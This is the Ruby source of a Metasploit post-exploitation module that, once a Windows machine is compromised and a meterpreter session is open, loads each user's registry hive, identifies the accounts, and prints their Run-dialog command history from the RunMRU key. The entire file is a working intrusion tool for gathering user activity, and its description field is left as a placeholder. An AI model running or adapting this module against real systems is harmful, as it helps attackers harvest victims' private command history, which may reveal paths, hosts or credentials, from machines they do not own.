require 'msf/core'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
	include Msf::Post::Windows::Registry
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::UserProfiles

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Gather MRU Last Commands',
				'Description'   => %q{
					## FIXME
				},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
						'haxom <haxom@haxom.net>'
					],
				'Version'       => '$Revision: 1 $',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ],
				'References'     =>
				[
					[ 'URL', 'http://support.microsoft.com/kb/142298' ]
				]
		))
	end


	def run
		host_name = sysinfo['Computer']
		print_status("Running against #{host_name} on session #{datastore['SESSION']}")

		userhives=load_missing_hives()
		userhives.each do |hive|
			next if hive['HKU'] == nil
			print_status("Looking at Key #{hive['HKU']}")
			user = resolve_sid(hive['SID'])
			if !(user.nil?) and !(user.empty?) and (user.include?(:type))
				print_status(" #{user[:domain]}\\#{user[:name]} (#{user[:type]})")
			end
			begin
				cur_key = "#{hive['HKU']}\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
			
				mru_list = registry_getvaldata(cur_key, "MRUList")
				if mru_list.nil? or mru_list.empty?
					print_error("No command found from MRU history\n")
					next
				end
				
				list = mru_list.split('')
				if mru_list.size == 1
					print_good("#{mru_list.size} command found from MRU history:")
				else
					print_good("#{mru_list.size} commands found from MRU history:")
				end
				list.each do |cur_value|
					value = registry_getvaldata(cur_key, cur_value)
					print("\tcmd> #{value[0..-3]}\n")
				end
				print("\n")
			rescue
				print_error("Cannot Access User SID: #{hive['HKU']}")
			end
		end
	end
end
